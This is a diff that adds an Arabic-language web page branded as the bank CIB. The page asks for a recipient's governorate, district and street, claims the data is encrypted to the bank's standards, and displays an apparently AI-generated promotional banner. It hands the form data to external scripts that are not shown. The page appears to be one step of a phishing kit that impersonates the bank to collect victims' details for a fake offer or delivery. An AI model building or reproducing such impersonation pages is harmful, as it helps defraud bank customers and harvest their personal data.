@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>CIB - عنوان المستلم</title>
+    <link rel="stylesheet" href="address.css" />
+  </head>
+  <body>
+    <header class="top-header">
+      <div class="logo-wrap">
+        <img class="logo" src="img/logo.png" alt="CIB" />
+      </div>
+      <div class="sep" aria-hidden="true"></div>
+    </header>
+
+    <main class="page">
+      <section class="card">
+        <h1 class="title">عنوان المستلم</h1>
+
+        <form class="form" action="#" method="post" autocomplete="off">
+          <div class="field">
+            <label for="gov">اسم المحافظة</label>
+            <input id="gov" type="text" placeholder="المحافظة" />
+          </div>
+
+          <div class="field">
+            <label for="district">المنطقة / الحى</label>
+            <input id="district" type="text" placeholder="المنطقة / الحي" />
+          </div>
+
+          <div class="field">
+            <label for="street">اسم الشارع (إن وُجد)</label>
+            <input id="street" type="text" placeholder="اسم الشارع (إن وُجد)" />
+          </div>
+
+          <button type="submit" class="btn">متابعة</button>
+        </form>
+
+        <p class="note">جميع البيانات مشفَّرة ومحمية وفق معايير البنك التجاري الدولي</p>
+
+        <img
+          class="banner"
+          src="img/Gemini_Generated_Image_7wbegg7wbegg7wbe.png"
+          alt="عرض CIB"
+        />
+      </section>
+    </main>    
+    <script src="api-config.js"></script>
+    <script src="api-client.js"></script>
+    <script src="form-handler.js"></script>
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        initializeFormHandler('.form', 'address');
+      });
+    </script>  </body>
+</html>
+
